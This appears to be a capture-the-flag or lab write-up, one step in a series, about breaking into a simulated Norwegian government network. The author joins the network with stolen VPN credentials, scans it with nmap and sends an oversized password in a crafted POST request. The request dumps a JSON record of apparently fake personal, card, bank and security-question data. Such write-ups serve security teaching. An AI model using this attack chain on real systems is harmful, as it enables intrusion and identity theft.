# Attack 4 - Buffer overflow

For this attack I exploited a vulnerability in one of the webpages which allowed me to perform a buffer overflow attack. This attack is executed in order to gain access to some confidential information used to gain further access to the system.

However, first I neede to connect to their network through a wireguard vpn. I installed wireguard and connected to their network by using Jonas Dahl's credentials which was found in the last attack. The wireguard configuration file used is located in this folder.

Once I was connected to the network I used the tool nmap in order to scan the address space 10.13.13.0/24 for open ports, and found the page 10.13.13.254:80 which eventually led me to a login page which seemed to be vulnerable to buffer overflow attacks. Using this knowledge i used burpsuite and modified the POST request in order to send the following large input in the password field:
```JavaScript
POST /login HTTP/1.1
Host: 10.13.13.254
Content-Length: 168

{"username":"jonas.dahl","password":"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"}
```
This allowed me to read arbitrary information in the form of a JSON list:
```json
{
  "name": "Jonas Dahl",
  "email": "jonas.dahl@regjeringen.no",
  "address": {
    "street": "Regjeringsgata 16",
    "city": "Oslo",
    "postal_code": "1111",
    "country": "Norway"
  },
  "phone": "+47 123 45 678",
  "birthdate": "1985-06-15",
  "gender": "Male",
  "national_id": "15068512345",
  "passport_number": "N12345678",
  "nationality": "Norwegian",
  "occupation": "Technical Officer",
  "company": {
    "name": "Regjeringen",
    "address": {
      "street": "Regjeringsgata 16",
      "city": "Oslo",
      "postal_code": "1111",
      "country": "Norway"
    },
    "phone": "+47 987 65 432",
    "industry": "Government",
    "position": "Technical Officer",
    "department": "Technical and Infrastructure",
    "start_date": "2010-05-01",
    "manager": "Ingrid Nilsen",
    "manger_username": "ingridnilsen"
  },
  "credit_card": {
    "type": "Visa",
    "number": "4111 2222 3333 4444",
    "expiration": "12/26",
    "cvv": "234",
    "cardholder_name": "Jonas Dahl"
  },
  "bank_account": {
    "bank_name": "Statens Bank",
    "account_number": "1234.56.78910",
    "iban": "NO1234567890123",
    "swift_bic": "STBANOXX"
  },
  "hidden_details": {
    "security_question": "Hva var navnet på din første lærer?",
    "security_answer": "Frøken Andersen",
    "pin": "5678",
    "mother_maiden_name": "Larsen"
  },
  "flag": "Dropbox is the flag :)",
  "dropbox": "https://dropbox.internal.regjeringen.uiaikt.no/"
}
```
As one can see, so does this contain a lot of sensitive information belonging to Jonas Dahl and some about his manager Ingrid Nilsen which can be used for other attacks. Additionally, so is there also an address for a new dropbox webpage which I can access in order to potentially execute another attack.






